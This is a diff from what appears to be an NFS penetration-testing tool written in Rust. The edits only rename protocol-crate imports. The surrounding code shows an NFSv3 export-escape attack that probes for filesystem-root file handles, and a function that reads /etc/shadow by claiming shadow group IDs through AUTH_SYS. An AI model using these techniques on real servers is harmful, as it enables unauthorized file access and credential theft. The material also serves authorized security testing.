@@ -20,7 +20,7 @@ use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::nfs3::types::FileHandle;
 use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
 use crate::util::stealth::StealthConfig;
-use nfs_proto::nfs3::Nfs3Result;
+use nfswolf_nfs3::wire::Nfs3Result;
 
 /// Escape an export to the filesystem root via subtree_check bypass.
 ///
@@ -149,7 +149,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
 /// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
 /// one-line-per-export summary instead.
 pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
-    use nfs_proto::nfs3::nfsstat3;
+    use nfswolf_nfs3::wire::nfsstat3;
     let addr = parse_addr_with_port(host, globals.nfs_port)?;
     let mount = make_mount_client(globals);
     let mnt = mount.mount(addr, export).await?;
@@ -165,7 +165,7 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
     // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
     // not be reported as an escape (#22/#48). `None` when root_squash blocks the
     // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
-    let export_fileid: Option<u64> = match probe_client.getattr(&nfs_proto::nfs3::GETATTR3args { object: mnt.handle.to_nfs_fh3() }).await {
+    let export_fileid: Option<u64> = match probe_client.getattr(&nfswolf_nfs3::wire::GETATTR3args { object: mnt.handle.to_nfs_fh3() }).await {
         Ok(Nfs3Result::Ok(ok)) => Some(ok.obj_attributes.fileid),
         _ => None,
     };
@@ -228,9 +228,9 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
             continue;
         };
 
-        let args = nfs_proto::nfs3::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
+        let args = nfswolf_nfs3::wire::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
         match probe_client.getattr(&args).await {
-            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfs_proto::nfs3::ftype3::NF3DIR => {
+            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfswolf_nfs3::wire::ftype3::NF3DIR => {
                 // A directory hit alone is not the root: inode numbers are dynamic
                 // (XFS), so the first directory in 2..200 can be an arbitrary
                 // subdirectory. Confirm it is not the export itself (identity) and
@@ -283,7 +283,7 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
 /// root; 32/64/128 are XFS roots only when the handle is XFS-identified (fileid_type 0x81),
 /// because on a compound-UUID ext4 export those are ordinary low-numbered directory inodes.
 async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
-    let Ok(Nfs3Result::Ok(ok)) = client.getattr(&nfs_proto::nfs3::GETATTR3args { object: mount_handle.to_nfs_fh3() }).await else {
+    let Ok(Nfs3Result::Ok(ok)) = client.getattr(&nfswolf_nfs3::wire::GETATTR3args { object: mount_handle.to_nfs_fh3() }).await else {
         return false; // cannot read the export root -- fall through to the normal probes
     };
     let export_inode = ok.obj_attributes.fileid;
@@ -300,7 +300,7 @@ async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bo
 /// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
 ///   blocks uid=0 reads on the root dir).
 async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>) -> bool {
-    use nfs_proto::nfs3::{GETATTR3args, ftype3, nfsstat3};
+    use nfswolf_nfs3::wire::{GETATTR3args, ftype3, nfsstat3};
     let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
     match client.getattr(&args).await {
         // A directory whose inode differs from the export root's is a genuine
@@ -319,8 +319,8 @@ async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, e
 /// in the scan range (e.g. an XFS export with non-standard geometry) has a
 /// different parent and is therefore rejected (#27).
 async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
-    use nfs_proto::nfs3::{GETATTR3args, LOOKUP3args, Nfs3Option, diropargs3, filename3};
-    use nfs_proto::xdr::Opaque;
+    use nfswolf_nfs3::wire::{GETATTR3args, LOOKUP3args, Nfs3Option, diropargs3, filename3};
+    use nfswolf_xdr::Opaque;
     let lookup = LOOKUP3args { what: diropargs3 { dir: handle.to_nfs_fh3(), name: filename3(Opaque::owned(b"..".to_vec())) } };
     let Ok(Nfs3Result::Ok(ok)) = client.lookup(&lookup).await else { return false };
     let parent_id = match ok.obj_attributes {
@@ -347,8 +347,8 @@ async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid:
 /// LOOKUP of a customary top-level entry (etc/bin/usr/...), which only the filesystem root
 /// carries -- gives the positive signal a bare ACCES lacks.
 async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
-    use nfs_proto::nfs3::{GETATTR3args, LOOKUP3args, diropargs3, filename3, ftype3};
-    use nfs_proto::xdr::Opaque;
+    use nfswolf_nfs3::wire::{GETATTR3args, LOOKUP3args, diropargs3, filename3, ftype3};
+    use nfswolf_xdr::Opaque;
 
     // root_squash conventionally maps root -> anonuid 65534 (nobody); claim it directly so
     // perms on the root dir (0755) are evaluated against an ordinary unprivileged uid.
@@ -389,8 +389,8 @@ fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
 /// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
 /// because we can claim GID 42/15 via AUTH_SYS.
 async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
-    use nfs_proto::nfs3::{LOOKUP3args, READ3args, diropargs3, filename3};
-    use nfs_proto::xdr::Opaque;
+    use nfswolf_nfs3::wire::{LOOKUP3args, READ3args, diropargs3, filename3};
+    use nfswolf_xdr::Opaque;
 
     // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
     const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];
